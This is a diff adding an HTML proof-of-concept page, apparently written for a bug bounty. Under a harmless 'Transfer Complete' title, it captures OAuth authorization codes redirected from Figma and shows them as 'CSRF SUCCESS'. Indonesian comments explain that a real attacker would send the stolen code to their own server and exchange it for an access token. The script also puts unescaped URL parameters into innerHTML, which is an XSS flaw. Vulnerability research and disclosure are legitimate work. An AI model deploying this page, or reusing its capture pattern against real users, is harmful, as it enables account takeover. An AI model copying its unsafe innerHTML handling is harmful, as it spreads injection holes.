@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Transfer Complete</title>
+</head>
+<body>
+    <h1>Processing Data...</h1>
+    <p>Please wait while we finalize your request.</p>
+    
+    <div id="codeDisplay"></div>
+
+    <script type="text/javascript">
+        // Fungsi untuk mendapatkan nilai parameter dari URL
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        const authCode = getQueryParam('code');
+        const state = getQueryParam('state');
+
+        const displayDiv = document.getElementById('codeDisplay');
+
+        if (authCode) {
+            // Ini adalah bukti keberhasilan CSRF!
+            displayDiv.innerHTML = '<h2>CSRF SUCCESS: Authorization Code Captured!</h2>' +
+                                   '<p>Code received from Figma (The server would now exchange this for an Access Token):</p>' +
+                                   '<code>' + authCode + '</code>' + 
+                                   '<p>State: <code>' + state + '</code></p>';
+                                   
+            // ***Catatan Penting:***
+            // Di titik ini, script ini akan GAGAL jika mencoba menukar token
+            // karena membutuhkan CLIENT_SECRET dan melanggar CORS.
+            // Di lingkungan bug bounty nyata, Anda akan mengirimkan token ini ke server Anda
+            // dan melakukan penukaran di backend.
+        } else {
+            displayDiv.innerHTML = '<p>No authorization code received.</p>';
+        }
+    </script>
+</body>
+</html>
